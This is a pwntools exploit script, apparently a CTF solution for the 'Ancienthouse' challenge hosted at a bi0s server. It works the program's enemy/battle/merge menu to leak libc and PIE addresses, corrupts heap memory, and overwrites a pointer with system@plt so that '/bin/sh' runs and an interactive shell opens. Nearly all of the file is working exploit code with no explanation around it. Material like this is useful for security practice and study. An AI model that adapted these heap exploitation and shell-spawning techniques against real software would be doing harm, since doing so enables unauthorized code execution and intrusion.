#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template Ancienthouse
import sys
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('Ancienthouse')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote("pwn.challenge.bi0s.in", 1230)

    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)

    return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

def add_enemy(name, size):
    log.info(f"Adding enemy with name: {name} / size: {size}")
    io.sendlineafter(b">> ", b"1")
    io.sendlineafter(b": ", str(size).encode())
    io.sendlineafter(b": ", name)
    log.success("Added")


def battle(id, kill=False):
    log.info(f"Battle with ID: {id}")
    io.sendlineafter(b">> ", b"2")
    io.sendlineafter(b": ", str(id).encode())
    res = io.recvuntil(b"!")
    if b"You beat 'em" in res:
        log.success("Battle won!")
        if kill:
            io.sendlineafter(b">>", b"1")
        else:
            io.sendlineafter(b">>", b"2")

    log.success("Battle finished")
    return res

def merge(id1, id2):
    log.info(f"Merging enemies with ID: {id1} and {id2}")
    io.sendlineafter(b">> ", b"3")
    io.sendlineafter(b": ", str(id1).encode())
    io.sendlineafter(b": ", str(id2).encode())
    log.success("Merged")

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

io.send(b"/bin/sh")

size = int(args.SIZE, 0) if args.SIZE else 0x20

add_enemy(b"X"*0x20, 0x20)
add_enemy(b"A"*0x10, 0x10)
add_enemy(b"B"*0x0f + int.to_bytes(0x60, 1, "little"), 0x10)

output = battle(0)

end = output.find(b"\n") - 5
beg = end - 6
leak = u64(output[beg:end].ljust(8, b"\x00"))

if leak >> 40 != 0x7f:
    io.close()
    sys.exit()
log.success(f"Got leak: {hex(leak)}")

payload = p64(leak+0x2000)

add_enemy(payload[1:], 0x10)
add_enemy(b"D"*0x20, 0x20)

for i in range(100//15):
    battle(3)

battle(3, kill=True)

merge(1, 2)

output = battle(4, kill=True)

end = output.find(b"\n") - 5
beg = end - 6
binary_leak = u64(output[beg:end].ljust(8, b"\x00"))


exe.address = binary_leak - 0x1b82
log.success(f"Got leak: {hex(exe.address)}")

add_enemy(p64(exe.plt.system) + p64(leak+0xff0), 0x50)

io.sendlineafter(b">> ", b"4")

io.interactive()

